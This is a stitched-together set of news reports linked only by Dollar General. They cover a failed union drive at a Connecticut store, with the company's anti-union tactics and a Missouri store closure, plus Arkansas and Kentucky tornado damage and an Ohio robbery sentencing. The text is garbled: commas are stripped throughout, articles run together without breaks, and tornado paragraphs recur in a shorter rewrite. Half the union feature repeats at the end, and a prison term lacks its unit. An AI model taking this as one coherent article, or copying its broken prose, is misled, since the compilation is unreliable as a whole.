WINSTED Conn. — The afternoon shift workers at Dollar General No. 18060 had listened with growing panic as an executive accused their store manager of stealing. They could hear the yelling and threats in the back office a scene that had shaken all of them — especially Shellie Parsons.

In a life marked by poverty addiction and physical abuse Parsons 37 had come to see her store — a beige prefabricated building on the outskirts of town — as her haven a $15.75-an-hour pathway to a better life. She was desperately afraid of losing it.

And so after a brief discussion with a few trusted co-workers she headed to a nearby Stop & Shop grocery store where years earlier she recalled seeing a picket line walked back to the deli counter and asked one of the butchers whom she had never met whether he had a phone number for someone at their union. She dialed from the parking lot.

“Why does it got to be me?” she recalled thinking as the phone rang. She feared that talking to a union organizer could get her fired even as she worried that doing nothing would leave her and her colleagues vulnerable to the whims of upper management.

All over the country workers who had labored through a global pandemic for low pay and meager benefits were concluding that they deserved better from their bosses. Wages were rising and a wave of strikes was sweeping across the country hitting iconic American brands such as Kellogg’s and John Deere. And now Parsons’s phone call was setting off one of the most lopsided battles of the ongoing low-wage-worker revolt.

On one side: six Dollar General employees most of whom were making the minimum wage or just slightly above it. The group included a community college student a struggling musician who had recently moved back home and two single moms one of whom was Parsons. On the other: a company with yearly revenue approaching $34 billion more than 157000 employees and 17683 stores not one of which was unionized.

Four days after her Sept. 17 phone call Parsons and a few of her co-workers met with the union organizer. To prepare she had written out what they all hoped to gain in a letter that went through three drafts and that Parsons had finished in the front seat of her car.

“We all want to make sure we can make a living and not worry we will get fired for false accusations or made up things” she wrote. “Take our words serious don’t just brush them off. … We are your employees not strangers.”

The workers wanted more job security. They wanted a process to ensure that their complaints weren’t ignored. They wanted to know that their labor was valued and that they were respected.

Parsons and three of her co-workers signed it and handed it over to the organizer with Local 371 of the United Food and Commercial Workers union. Then they signed union cards authorizing an election scheduled for Oct. 22 — exactly one month away. To prevail all the signees — or four of the store’s six workers — would have to vote for the union.

Parsons and her fellow workers weren’t just trying to unionize; they were challenging a core aspect of the business model that has fueled Dollar General’s boom over the past decade.

“We believe our union free status is one reason we continue to grow and provide employment while many unionized companies have declined” the company wrote in third paragraph of its 2015 employee handbook.

Dollar General had carved out a niche that allowed it to thrive in communities where people were struggling to put food on the table and pay their bills and there were more and more of these places popping up throughout the country ever year.

To serve these communities Dollar General has concentrated on needs not wants. Each store typically consists of about 7400 square feet of cramped dimly lit aisles focusing on staples such as milk eggs and diapers as well as products such as pain relievers frying pans and motor oil. They are stocked in small sizes instead of bulk to keep prices low and profit margins high. Staffing is just as spare — typically six employees and a manager who often works six or seven days a week.

The approach had proved so successful that by 2020 there were more dollar stores — a category that includes Dollar Tree and Family Dollar — in the United States than all the Walmart Starbucks and McDonald’s locations combined. Of these Dollar General was the biggest of them all.

Before the vote at Parsons’s store the last serious effort to unionize a Dollar General came in December 2017 when workers in Auxvasse Mo. sought to become the first store in company history to join the UFCW.

Dollar General moved swiftly to quell the Auxvasse uprising. In the weeks before the vote company executives flew into town on a private jet and the vice president for human resources embedded herself in the store working alongside employees cleaning windows stocking shelves and making the case for rejecting the union according to workers and court documents.

The employees voted 4 to 2 to organize an outcome Dollar General spent the next 28 months fighting in the courts on the grounds that the vote was flawed. In the middle of its legal battle the company fired the employee who initially called the union for using a curse word in a private meeting with his district manager.

As part of a settlement approved by the National Labor Relations Board Dollar General agreed to compensate the fired worker. The company was also required to post a notice in the Auxvasse store’s break room acknowledging the monetary settlement and its workers’ right to organize.

“WE WILL NOT fire you because of your union membership or support” the notice read.

Instead the company took a more extreme step: It closed the store early last year only weeks after the U.S. Court of Appeals for the 8th Circuit ordered Dollar General to recognize and bargain with the union. Alan Bloom 70 a cashier said some of the store’s employees including its manager negotiated transfers. Bloom decided to retire.

He had voted for the union but now that the store was closing he wished he hadn’t. “For a while it felt revolutionary like we were going to change things” he said. “But that didn’t happen. The store just closed.”

Dollar General was the town’s only national chain and the only place — besides a gas station convenience store — that sold frozen food snacks and canned goods. “It’s left a hole in our town” said Ashley Steinbeck Auxvasse’s mayor. “It was such a convenience for everyone especially for elderly folks who can’t get around really well.”

In a statement Dollar General said the decision to close the store just weeks after it was ordered to negotiate with the union was based on an “assessment of the store’s future profitability.”

David Cook the president of UFCW Local 655 in Missouri suggested a different motive. “It’s a control issue” he said. “I don’t think anybody out there recognizes the value an employer like Dollar General puts on having an at-will workforce. ‘At will’ means I can fire you for any reason I want as long as it’s not color religion or ethnicity. It’s that ultimate power of intimidation. … You can’t put a value on that if you’re an employer — especially one the size of Dollar General.”

Parsons didn’t know any of this history when she placed her call to the union in September. She was just worried about losing a job that offered a sense of stability and predictability in a life that had often felt on the brink of collapse.

She had spent her teenage years in foster care battled a heroin addiction and served a year in prison but by the time she started at Dollar General in 2019 she was beginning to pull her life together. Other than a brief relapse and terrifying overdose in early 2019 she had been drug-free for most of the past 12 years. She was trying to end an abusive relationship and her boss and colleagues had offered support noticing the bruises on her body and encouraging her to leave her partner.

Aside from Bella her 8-year-old daughter Parsons’s store had become the most important thing in her life a place where she felt successful earning pay raises and a promotion to assistant manager.

“I don’t have any family. I have no one” she said. “And when I started working for Dollar General I got away from my lifelong abuser and I survived and I got a family and a future.”

Parsons didn’t expect better pay or benefits from unionizing. She just wanted to hold on to what she had.

In the days after she and her co-workers signed union cards the company hired five anti-union consultants each of whom was paid $2700 a day according to documents filed with the Labor Department. It dispatched three out-of-state executives to the store who shadowed the employees for the month working alongside them. Sometimes the executives talked baseball hunting or music with the store employees.

Other times they warned them about the union which they said would make them pay costly dues and ruin their relationship with their store manager whom they liked and admired.

Mostly the executives seemed to be spying on them the employees said. About a week after they arrived at the store Jake Serafini 31 was restocking an aisle with one of his co-workers he recalled. “I would never be able to do this job for $7.25 an hour” he said thinking of the minimum wage in North Carolina where he had lived before returning home to Winsted.

Seconds later Serafini said one of the corporate executives emerged from a nearby aisle. “The minimum wage in Connecticut is $13 an hour” he said.

Serafini a part-time musician agreed but noted that it was still a “little low” given the state’s high cost of living. He didn’t think much about the incident until the same executive spotted him a few days later stacking pizzas in a freezer that was badly overstocked.

“It looks there are sparks coming out of your ears” the executive said.

“Look at this f---ing bullsh--” Serafini replied pointing to the mess. The executive offered to show him how to fix the oversupply problem and Serafini said he apologized for cursing.

After his shift Serafini said two of his co-workers approached as he was walking to his car and told him they had been ordered to sign statements saying they had heard him curse. Serafini’s store manager called that evening and fired him. In his five months with the company Serafini hadn’t missed a shift and had no disciplinary write-ups.

“My heart is breaking” Serafini recalled his boss saying. “I’m doing everything I can on my end. We’re going to get you back.”

The dismissal shook some of Serafini’s co-workers who were convinced that he was fired because he was pro-union or possibly because the Dollar General executives believed he had instigated the union drive. It incensed Parsons who felt responsible. Serafini had been filling in for her on the day he was fired.

At the union’s request Parsons did interviews with CNN HuffPost and the Hartford Courant. She recorded a video for More Perfect Union a labor advocacy group in which she talked about Serafini’s dismissal. “The only people that can save us is a union” she said on the video.

Six days before the vote Parsons believed that three out of six employees including Serafini who despite his dismissal was allowed to vote were pro-union. One was wavering a worker named Jen whose vote was crucial. The woman did not respond to requests for comment from The Washington Post for this story. Parsons said that a Dollar General executive had warned Jen about the closing of the Auxvasse store and suggested that the same thing could happen in Connecticut.

“I need you to call Jen and talk to her” Parsons texted the UFCW organizer Jessica Petronella. “They are getting to her. We have to act Very Quickly or we are going to lose her.”

Three days before the vote Parsons Jen and Petronella met in a supermarket parking lot a short drive down the highway from the Dollar General. It was a spot where they hoped that the company’s executives and consultants who now outnumbered the workers wouldn’t see them.

Petronella said she asked Jen to draft a statement describing what she considered to be the company’s threat to close the store along with an account of Serafini’s firing. Jen wrote that the executive told her to “look into the dollar general store that had been closed” and shared that Serafini’s firing may have been related to corporate’s belief that he had been the first to call the union.

Dollar General in response to questions from The Post said that no threats were made to close the Connecticut store and denied that Serafini was “treated unlawfully.”

Petronella intended to give Jen’s statement to the National Labor Relations Board which oversees union elections to ensure they are fair. She also saw the letter as a positive sign that Jen still supported the union.

On election day the NLRB set up a small white tent in the parking lot of the Dollar General. Parsons who agreed to serve as an observer for the union arrived at 8:30 a.m. and cast her ballot. A worker representing the company occupied a second table. For the next two hours Parsons sat watched and nervously waited as her co-workers cycled through.

Dollar General was challenging Serafini’s ballot but he was still allowed to vote. “It’s a great day for democracy” he told Parsons as he entered the tent.

“Absolutely!” Parsons replied.

A second co-worker who backed the union grinned at Parsons as he dropped his ballot in the cardboard box. A good sign. There were two workers both part-timers who hadn’t supported the union. Parsons assumed they both voted no.

She was most worried about Jen who stood over her ballot for several seconds shaking her head as if she was thinking Parsons said. Parsons tried to catch her eye but Jen hurried past her.

At 11:05 a.m. an NLRB representative counted the votes. To prevail Dollar General needed at least three of the six workers to vote against the union. The first two votes were both no. Then there was a yes followed by a brief pause as the NLRB representative unfolded the next ballot. Parsons breathed in through her light blue surgical mask.

“No” the NLRB official read.

At first Parsons didn’t believe it. She walked out of the tent and into the sunlight lit a cigarette and inhaled deeply. One of her co-workers called Serafini to let him know the outcome.

“I hate to be the one to tell you” he began.

“You’re kidding” Serafini replied. He had assumed that the union would win and that he would be back to work in a week or two. Now he felt alone.

Parsons and Petronella drove to a nearby McDonald’s to figure out what had happened and talk about their next steps. Tears streamed down Parsons’s face. She believed that the election hadn’t been fair that Dollar General had “polluted” her colleagues’ minds with falsehoods and fear.

“Obviously Jen voted no” Petronella said.

Over the course of her life Parsons had grown accustomed to feeling abandoned — by her parents the foster-care system the police and the courts. Now she wanted the union to stand with her appeal the vote to the NLRB and keep fighting.

“What do we do now?” she asked Petronella.

For Petronella and the union the answer was to move on to other battles. She could have sought an order that would have forced Dollar General to bargain with the union. “You have to hire lawyers and it ends up costing a lot” Petronella said. For a company like Dollar General the expense was nothing. But the union’s resources were limited.

Petronella decided that it would be faster and cheaper to wait 12 months and petition for another union vote if Parsons and her co-workers were still interested. Her last piece of unfinished business from the Dollar General organizing effort was Serafini who with the help of the union and a Labor Department lawyer was negotiating a wrongful-dismissal settlement with Dollar General.

Petronella wanted Dollar General to have to acknowledge publicly its agreement with Serafini just as it had done in Missouri.

Serafini’s immediate goal was to pay some bills and move on with his life perhaps becoming a social worker. His dismissal he said had revealed what Dollar General really thought of its workers. “You have people go above and beyond for a minimum-wage job and then get tossed because a union might mean it costs a little more to run the store. It’s all about greed” he said. “It just feels gross.”

For Parsons there was only one option after the union organizing effort failed: A few weeks after the election her alarm clock woke her at 5:15 a.m. giving her just enough time to stop by the methadone clinic for her daily dose before heading off to work.

The Dollar General executives had returned home and the store had settled back into its old rhythms. Parsons helped unload a “humongous truck” that arrived that morning and fell off a ladder while trying to retrieve a box of adult diapers from a storage shelf for an elderly customer. In the afternoon she headed off to a second job cleaning houses. She lugged bags of supplies and a scuffed yellow vacuum up the driveway of a small brick ranch house her back still throbbing from her fall. After only a few minutes of work her forehead glistened with sweat.

Parsons was more than $5000 behind on her electricity bill but was determined to use the money from her housekeeping jobs to pay the lawyer who was helping her fight for custody of her daughter. She saw Bella three times a week — visits that began with tense handoffs that Parsons knew took the heaviest toll on Bella.

After police charged Parsons’s ex with “threatening” behavior and “breach of peace” the courts granted Parsons a restraining order and mandated that she and her former partner exchange Bella in a well-lit public spot. For now it was the Big Y supermarket. Inside the store the two parents stood about 10 yards apart recording each other with their phones as their 8-year-old daughter ran with her head down from her father to her mother.

“Today Mommy doesn’t have too much money” Parsons said as she hurriedly outlined some options for their three-hour visit. Bella chose a $5.75 matinee of the new Marvel movie and Parsons began firing questions at her.

“Have you taken a shower lately?”

“What’s Daddy feeding you?”

“You’re still coughing baby. Are you taking your medicine?”

Three-quarters of the way through the movie Bella started to worry that they were going to be late for the court-mandated 8 p.m. drop-off with her dad. So they left early giving Parsons just enough time for a quick cigarette break before they sped through the Wendy’s drive-through. Her feet were sore. Her back still ached. Her gas gauge hovered just above empty. Parsons lit a cigarette in the parking lot. A few kernels of movie theater popcorn tossed by a giggling Bella struck her on the cheek.

Back at the Big Y they repeated the recorded drop-off in reverse. This was the worst part of Parsons’s day the time she felt most alone. “I fight addiction. I fight for my job. I fight for my kid. I fight for my survival” she said. “Every single way I turn I have to fight.”

One thing she could no longer afford to fight was Dollar General and so these days she was focused relentlessly on the company’s positives. Dollar General had dismissed the district manager who accused her boss of stealing — falsely employees said — and replaced him with a new person who seemed fair. The new district manager had recently promised to start reimbursing store employees for their mileage when they had to drive to the bank to drop off the day’s deposits. It wasn’t yet clear whether they would be reimbursed thousands of dollars for earlier unpaid trips.

“After the election I started to find out the truth about Dollar General” Parsons said. “It is not what we thought. If they knew what was going on they would have fixed it earlier. Really it was just a couple of bad people. Everyone has their flaws but Dollar General is great people.”

Parsons didn’t regret calling the union. Without the organizing effort she believed the problems at her store would never have been addressed. “It helped 100 percent” she said. But she also wasn’t upset that the unionizing push had failed. “If we won honestly I don’t know anymore” she continued. “I don’t know if it’d be different. Everything is just confusing.”

Two weeks before Thanksgiving Parsons received another bit of good news: Someone had posted on Parsons’s employee group text chat that the store would be closed on the holiday a change from previous years when it had been open for extended hours. “The union isn’t involved and they are still doing it” she said.

But it turned out that the company wasn’t actually doing it. The store was open from 7 a.m. to 10 p.m. on Thanksgiving Day just as it had been the previous year and Parsons was scheduled to work.

She didn’t let it bother her. She needed the money. She worked an 11-hour shift and then rushed to the Big Y where Bella was waiting.

TRUMANN -- The second Jada Madden sat down in her bathtub with her fiance and their 7-month-old son their house disappeared from above them.

""It felt like it was burying us underneath the ground"" she said Saturday -- a day after tornadoes ripped through this Northeast Arkansas town and others around it before continuing its deadly march east.

Madden's feet were stuck in the rubble so her fiance climbed out first carrying their baby before helping her up. First responders arrived in their neighborhood on the east side of Trumann shortly afterward.

Madden's house was one of more than 200 damaged or destroyed by a tornado in Trumann on Friday night according to Arkansas Recovery and Coordination Center spokeswoman Rebekah Magnus.

Mayor Barbara Lewallen said Saturday that she was grateful there were no fatalities in the city.

Other towns weren't so lucky as tornadoes and severe storms struck Craighead and Mississippi counties claiming two lives injuring at least five people and damaging several homes businesses and utilities in Monette Leachville and Lake City.

Meteorologists suspect that at least 30 tornadoes tore through Arkansas Missouri Illinois Kentucky Tennessee and Mississippi on Friday.

Roughly 25000 Arkansans had lost power because of the tornadoes as of Saturday morning.

Debris littered the rows of crops on the outskirts of Monette on Saturday.

Some roads remained closed in Trumann and the storm left lumber from the nearly two dozen-homes neighborhood it leveled stacked in a yard -- the stack reaching the height of the weather-beaten residences nearby.

Gov. Asa Hutchinson and A.J. Gary director of the state's Division of Emergency Management visited a destroyed nursing home in Monette on Saturday and observed the wreckage in Leachville via helicopter.

""Probably the most remarkable thing is that there was not a greater loss of life [in the region]"" Hutchinson said in a news conference.

He declared a state of emergency Saturday and urged residents to report damaged property to their insurance providers and local emergency management agencies in case the region qualifies for federal disaster relief funding.

Craighead County's emergency management agency is helping residents assess damage County Judge Marvin Day said in an interview.

President Joe Biden said Saturday afternoon that the federal government will do what it can to help the regions affected by the tornadoes.

Friday's tornadoes were the first fatal twisters in Arkansas since 2018 according to the National Oceanic and Atmospheric Administration.

ORIGIN OF THE STORMS

On Friday temperatures in Arkansas rose into the 70s as warm moist air from the Gulf of Mexico moved into the state mixing with wind energy to create the conditions for severe thunderstorms.

The National Weather Service said a tornado that began in Arkansas proceeded to tear through Missouri Tennessee and Kentucky.

Some of the storms that turned into the super-cell thunderstorms that generated the tornado began just southwest of Little Rock said Thomas Jones a meteorologist with the National Weather Service in Little Rock.

""Here in Arkansas we were basically the starting pin"" Jones said.

The storms moved northeast across Little Rock and along Interstate 30 strengthening in Northeast Arkansas and continuing across the Mississippi River while producing tornadoes.

The National Weather Service's Little Rock office tracked three tornadoes according to preliminary data. Northeast Arkansas is part of the agency's Memphis office coverage area not the Little Rock coverage area.





One of the three tornadoes was an EF2 twister in Augusta with wind speeds ranging from 111-135 mph injuring three people. The tornado was 500 yards wide with a path length of 8.6 miles according to reports.

Two EF1 tornadoes with wind speeds ranging from 86-110 mph in Diaz and Beedeville left no reported injuries or deaths Jones said.

For Northeast Arkansas it might have been the same tornado that tore through the region and moved into Missouri Tennessee and Kentucky but as of Saturday evening data was not yet conclusive according to Michael Hill lead forecaster with the National Weather Service in Memphis.

""Everything is pointing to it being one tornado the entire time but you know until we get out there and really look at it we can't absolutely officially say yes"" Hill said.

Severe weather is common in Arkansas this time of year as November to January serves as the state's secondary season for severe weather.

But while tornadoes in December are not rare the intensity of Friday night's storm was.

""It was not your run-of-the-mill simple tornado"" Hill said. ""This was a very strong large and violent tornado that had all the ingredients to itself to continue to get stronger and stronger as it moved to the northeast. So it was definitely one that will go in the record books.""

'KEEP TRUCKIN'

Trumann firefighters were headed to assist Monette on Friday when they were informed of the destruction in their own city including at least 20 houses on Wayne Street where Madden and her family lived.

Madden's uncle is a firefighter and she said she had ""never been so happy"" to see him when the trucks arrived.

Samantha Harris and her mother Teresa Green also lived on Wayne Street and were not home when the tornado struck. Much of the debris in their yard was the remnants of the house across the street she said.

Harris and Green managed to salvage some clothes and keepsakes and find one of their three pets in the rubble. The other two pets were still missing Saturday afternoon.

""We're going to come back tomorrow try to get some more stuff and just keep truckin'"" Harris said.

Lewallen said the damage throughout Trumann is ""going to take a while"" to fully assess and clean up. Restoring power running water and the sewer system were top priorities Saturday.

""The big thing is we need the citizens to have shelter access to help do whatever we need to do to get them relocated to someplace that can help them"" she said.

'A BATTERING RAM'

The Craighead County tornado touched down at 8:33 p.m. Friday according to the National Weather Service.

In neighboring Mississippi County Leachville's Dollar General store the only source of groceries in the city of fewer than 2000 people collapsed in the tornado killing one person.

Without the Dollar General ""we're screwed"" said Molly Johnson who has lived in Leachville her entire life.

Johnson's house just up the road from the store was ""totaled"" and ""not fixable"" she said. The tornado left a hole in the front of the house and broken glass everywhere. She salvaged some of her furniture by moving it away from the windows.

She and her son who had just returned home from his first semester of college huddled with their cat in the closet and put pillows over their heads she said.

""It was this pressure that you would not believe and you could feel the house pick up and move from its foundation"" Johnson said.

They left the house through the back door climbed through the debris pile of trees in the yard and slept at a neighbor's house. Johnson said she does not know where they will stay now.

The tornado moved to Leachville through Monette where one of the 67 residents of the Monette Manor nursing home died Friday night.

Owner Rick Sampson said the nursing home's staff of more than 80 people rallied to evacuate the building and the local school district provided buses to transport the nursing home residents to shelter at the gym inside Buffalo Island Central Senior High School.

Initial reports Friday suggested that about 20 people were trapped in the nursing home. Sampson said that was not quite accurate but ""it took a little while to get to people.""

Sampson has run the nursing home for 20 years.

""It's a tremendous loss it's something we've been a part of for a very long time and seeing it in the condition it's in now is pretty depressing"" he said.

Elected officials including Monette Mayor Bob Blankenship; state Rep. Brandt Smith R-Jonesboro; and U.S. Rep. Rick Crawford R-Ark. also visited the devastated areas Saturday.

Crawford whose district includes Northeast Arkansas said in a news release that his office ""will continue to assist those who have experienced the worst of these storms in any way we can"" and thanked first responders for their actions Friday night.

Many houses in the neighborhood across the street from Monette Manor were damaged including Monette firefighter Jordan Wood's house which lost all of the shingles on the roof. His neighbors worked together to secure a tarp over the roof Saturday morning.

Wood described the tornado as ""a battering ram"" and after it passed he went from house to house checking on the neighbors until he got to the nursing home.

""It was probably one of the worst things I've ever encountered in my life"" he said. ""You have helpless people that are probably 90% wheelchair-bound with the roof falling in and they couldn't get out.""

Wood and Day the county judge said Craighead County residents do their best to support their neighbors in tough times.

Friday's twisters came not quite two years after an EF3 tornado leveled parts of Jonesboro one of the Craighead County seats. While there were no fatalities in that storm more than 130 homes were destroyed and nearly two dozen people were injured.

Day said as far as he was aware no one in Craighead County lost their home completely on Friday.

""You look at Monette Manor and you just can't believe there were survivors so we're very grateful it wasn't worse than it was"" he said.

David Johnson 34 will serve between 47 and 52.5 in prison on the Lake County charges after being found guilty in November by a Lake County Common Pleas Court jury on 10 of the 13 charges against him.

Johnson was found guilty on charges stemming from armed robberies at a Perry Township Marathon gas station onJan. 16 and a Willoughby Dollar General on Jan. 21 2020. He was found not guilty on charges stemming from an alleged Dec. 19 2019 incident in Willoughby.

In the Marathon gas station robbery the Lake County Sheriff’s Office stated Johnson entered the store and brandished a semi-automatic handgun and held a female customer in the store down against the counter as he demanded cash from an employee. After the employee provided him with the available cash he forcibly moved the woman away from the counter and pushed her out the door in front of him while continuing to hold the gun. He released the woman after leaving the store.

Lake County Common Pleas Court Judge Eugene A. Lucci who presided over the trial also ordered Johnson to pay $333.69 to the Willoughby Dollar General and $228.52 to the Perry Township Marathon. He was also required to forfeit a Taurus semi-automatic pistol according to court records. Johnson has 208 days jail credit.

Johnson is facing charges in federal court related to the alleged Geauga and Cuyahoga county incidents. He is facing four counts of robbery four counts of brandishing a firearm during a crime of violence and one count of being a felon in possession of a firearm.

According to federal court records Johnson is accused of a Nov. 27 2019 Sunoco gas station robbery in Euclid a Jan. 18 BP gas station robbery in Parkman a Jan. 18 robbery of a Dollar General in Chardon and a Jan. 25 Gas Mart robbery in Euclid.

Johnson is prohibited from possessing a firearm due to previous convictions for felon in possession of a firearm involuntary manslaughter and aggravated robbery according to the U.S. Attorney’s Office for the Northern District of Ohio.

A trial date for the federal case has not yet been set. In September Northern District of Ohio Judge Dan Aaron Polster continued the trial until the conclusion of the Lake County case.

Craighead County Judge Marvin Day said the county's emergency management agency is helping people assess the damage.

Northeast of Monette the tornado destroyed the Dollar General store in Leachville killing one person.

Leachville residents have nowhere to buy groceries without the Dollar General said Molly Johnson whose house down the street from the store was ""totaled.""

Elected officials at all levels including U.S. Rep. Rick Crawford R-Arkansas toured the damaged region on Saturday.

'Most devastating tornado event'

Kentucky Gov. Andy Beshear said upwards of 70 may have died when a twister touched down for more than 200 miles in his state but the number of deaths could exceed 100 across 10 or more counties.

""This has been the most devastating tornado event in our state's history"" Beshear said at a news conference.

The storms hit a candle factory in Kentucky an Amazon facility in Illinois and the nursing home in Arkansas. Officials had confirmed 18 deaths by Saturday including 10 in the Kentucky's Muhlenberg County and an undetermined number in an around the city of Bowling Green. Beshear said about 110 people were in the Mayfield factory when the tornado roared through.

Debris from destroyed buildings and shredded trees covered the ground in Mayfield a city of about 10000 in western Kentucky. Twisted metal sheeting downed power lines and wrecked vehicles lined the streets of what was barely recognizable as a town.

At least one person died at an Amazon facility in Edwardsville Illinois Police Chief Mike Fillback told reporters Saturday morning. The roof of the building was ripped off and a wall about the length of a football field collapsed.

Two people at the facility were taken to hospitals in St. Louis about 25 miles away Fillback said. The chief said he did not know their medical conditions. About 30 people who were in the building were taken to the police station for evaluation.

Early Saturday rescue crews were still sorting through the rubble. Fillback said the process could take several more hours. Cranes and backhoes were brought in to help move debris.

Workers at a National Weather Service office had to take shelter as a tornado passed near their office in Weldon Spring Missouri about 30 miles west of St. Louis. One person died and two others were injured in building collapses near the towns of Defiance and New Melle both just a few miles from the weather service office.

""This was an incredible storm that lasted a long time and covered a lot of territory"" said Larry Vannozzi meteorologist in charge of the National Weather Service office covering the Nashville area.

Meteorologists haven't determined whether the storm spawned a single tornado or multiple tornadoes he said.

Three storm-related deaths were confirmed in northwestern Tennessee said Dean Flener spokesman for the Tennessee Emergency Management Agency.

The storms swept through Bowling Green Kentucky near the Tennessee border tearing roofs off homes and flinging debris into roadways. Western Kentucky University's president said on Twitter that one of its student who lived off-campus was killed. The school called off commencement ceremonies that were planned for Saturday because the campus was without power.

The worker revolt comes to a Dollar General in Connecticut A call to a union triggers one of the most lopsided battles of the ongoing low-wage-worker revolt

WINSTED Conn. — The afternoon shift workers at Dollar General No. 18060 had listened with growing panic as an executive accused their store manager of stealing. They could hear the yelling and threats in the back office a scene that had shaken all of them — especially Shellie Parsons.

In a life marked by poverty addiction and physical abuse Parsons 37 had come to see her store — a beige prefabricated building on the outskirts of town — as her haven a $15.75-an-hour pathway to a better life. She was desperately afraid of losing it.

And so after a brief discussion with a few trusted co-workers she headed to a nearby Stop & Shop grocery store where years earlier she recalled seeing a picket line walked back to the deli counter and asked one of the butchers whom she had never met whether he had a phone number for someone at their union. She dialed from the parking lot.

“Why does it got to be me?” she recalled thinking as the phone rang. She feared that talking to a union organizer could get her fired even as she worried that doing nothing would leave her and her colleagues vulnerable to the whims of upper management.

All over the country workers who had labored through a global pandemic for low pay and meager benefits were concluding that they deserved better from their bosses. Wages were rising and a wave of strikes was sweeping across the country hitting iconic American brands such as Kellogg’s and John Deere. And now Parsons’s phone call was setting off one of the most lopsided battles of the ongoing low-wage-worker revolt.

On one side: six Dollar General employees most of whom were making the minimum wage or just slightly above it. The group included a community college student a struggling musician who had recently moved back home and two single moms one of whom was Parsons. On the other: a company with yearly revenue approaching $34 billion more than 157000 employees and 17683 stores not one of which was unionized.

Four days after her Sept. 17 phone call Parsons and a few of her co-workers met with the union organizer. To prepare she had written out what they all hoped to gain in a letter that went through three drafts and that Parsons had finished in the front seat of her car.

“We all want to make sure we can make a living and not worry we will get fired for false accusations or made up things” she wrote. “Take our words serious don’t just brush them off. … We are your employees not strangers.”

The workers wanted more job security. They wanted a process to ensure that their complaints weren’t ignored. They wanted to know that their labor was valued and that they were respected.

Parsons and three of her co-workers signed it and handed it over to the organizer with Local 371 of the United Food and Commercial Workers union. Then they signed union cards authorizing an election scheduled for Oct. 22 — exactly one month away. To prevail all the signees — or four of the store’s six workers — would have to vote for the union.

Parsons and her fellow workers weren’t just trying to unionize; they were challenging a core aspect of the business model that has fueled Dollar General’s boom over the past decade.

“We believe our union free status is one reason we continue to grow and provide employment while many unionized companies have declined” the company wrote in third paragraph of its 2015 employee handbook.

Dollar General had carved out a niche that allowed it to thrive in communities where people were struggling to put food on the table and pay their bills and there were more and more of these places popping up throughout the country ever year.

To serve these communities Dollar General has concentrated on needs not wants. Each store typically consists of about 7400 square feet of cramped dimly lit aisles focusing on staples such as milk eggs and diapers as well as products such as pain relievers frying pans and motor oil. They are stocked in small sizes instead of bulk to keep prices low and profit margins high. Staffing is just as spare — typically six employees and a manager who often works six or seven days a week.

The approach had proved so successful that by 2020 there were more dollar stores — a category that includes Dollar Tree and Family Dollar — in the United States than all the Walmart Starbucks and McDonald’s locations combined. Of these Dollar General was the biggest of them all.

Before the vote at Parsons’s store the last serious effort to unionize a Dollar General came in December 2017 when workers in Auxvasse Mo. sought to become the first store in company history to join the UFCW.

Dollar General moved swiftly to quell the Auxvasse uprising. In the weeks before the vote company executives flew into town on a private jet and the vice president for human resources embedded herself in the store working alongside employees cleaning windows stocking shelves and making the case for rejecting the union according to workers and court documents.

The employees voted 4 to 2 to organize an outcome Dollar General spent the next 28 months fighting in the courts on the grounds that the vote was flawed. In the middle of its legal battle the company fired the employee who initially called the union for using a curse word in a private meeting with his district manager.

As part of a settlement approved by the National Labor Relations Board Dollar General agreed to compensate the fired worker. The company was also required to post a notice in the Auxvasse store’s break room acknowledging the monetary settlement and its workers’ right to organize.

“WE WILL NOT fire you because of your union membership or support” the notice read.

Instead the company took a more extreme step: It closed the store early last year only weeks after the U.S. Court of Appeals for the 8th Circuit ordered Dollar General to recognize and bargain with the union. Alan Bloom 70 a cashier said some of the store’s employees including its manager negotiated transfers. Bloom decided to retire.

He had voted for the union but now that the store was closing he wished he hadn’t. “For a while it felt revolutionary like we were going to change things” he said. “But that didn’t happen. The store just closed.”

Dollar General was the town’s only national chain and the only place — besides a gas station convenience store — that sold frozen food snacks and canned goods. “It’s left a hole in our town” said Ashley Steinbeck Auxvasse’s mayor. “It was such a convenience for everyone especially for elderly folks who can’t get around really well.”

In a statement Dollar General said the decision to close the store just weeks after it was ordered to negotiate with the union was based on an “assessment of the store’s future profitability.”

David Cook the president of UFCW Local 655 in Missouri suggested a different motive. “It’s a control issue” he said. “I don’t think anybody out there recognizes the value an employer like Dollar General puts on having an at-will workforce. ‘At will’ means I can fire you for any reason I want as long as it’s not color religion or ethnicity. It’s that ultimate power of intimidation. … You can’t put a value on that if you’re an employer — especially one the size of Dollar General.”

Parsons didn’t know any of this history when she placed her call to the union in September. She was just worried about losing a job that offered a sense of stability and predictability in a life that had often felt on the brink of collapse.

She had spent her teenage years in foster care battled a heroin addiction and served a year in prison but by the time she started at Dollar General in 2019 she was beginning to pull her life together. Other than a brief relapse and terrifying overdose in early 2019 she had been drug-free for most of the past 12 years. She was trying to end an abusive relationship and her boss and colleagues had offered support noticing the bruises on her body and encouraging her to leave her partner.

Aside from Bella her 8-year-old daughter Parsons’s store had become the most important thing in her life a place where she felt successful earning pay raises and a promotion to assistant manager.

“I don’t have any family. I have no one” she said. “And when I started working for Dollar General I got away from my lifelong abuser and I survived and I got a family and a future.”

Parsons didn’t expect better pay or benefits from unionizing. She just wanted to hold on to what she had.

In the days after she and her co-workers signed union cards the company hired five anti-union consultants each of whom was paid $2700 a day according to documents filed with the Labor Department. It dispatched three out-of-state executives to the store who shadowed the employees for the month working alongside them. Sometimes the executives talked baseball hunting or music with the store employees.

Other times they warned them about the union which they said would make them pay costly dues and ruin their relationship with their store manager whom they liked and admired.

Mostly the executives seemed to be spying on them the employees said. About a week after they arrived at the store Jake Serafini 31 was restocking an aisle with one of his co-workers he recalled. “I would never be able to do this job for $7.25 an hour” he said thinking of the minimum wage in North Carolina where he had lived before returning home to Winsted.

Seconds later Serafini said one of the corporate executives emerged from a nearby aisle. “The minimum wage in Connecticut is $13 an hour” he said.

Serafini a part-time musician agreed but noted that it was still a “little low” given the state’s high cost of living. He didn’t think much about the incident until the same executive spotted him a few days later stacking pizzas in a freezer that was badly overstocked.

“It looks there are sparks coming out of your ears” the executive said.

“Look at this f---ing bullsh--” Serafini replied pointing to the mess. The executive offered to show him how to fix the oversupply problem and Serafini said he apologized for cursing.

After his shift Serafini said two of his co-workers approached as he was walking to his car and told him they had been ordered to sign statements saying they had heard him curse. Serafini’s store manager called that evening and fired him. In his five months with the company Serafini hadn’t missed a shift and had no disciplinary write-ups.

“My heart is breaking” Serafini recalled his boss saying. “I’m doing everything I can on my end. We’re going to get you back.”

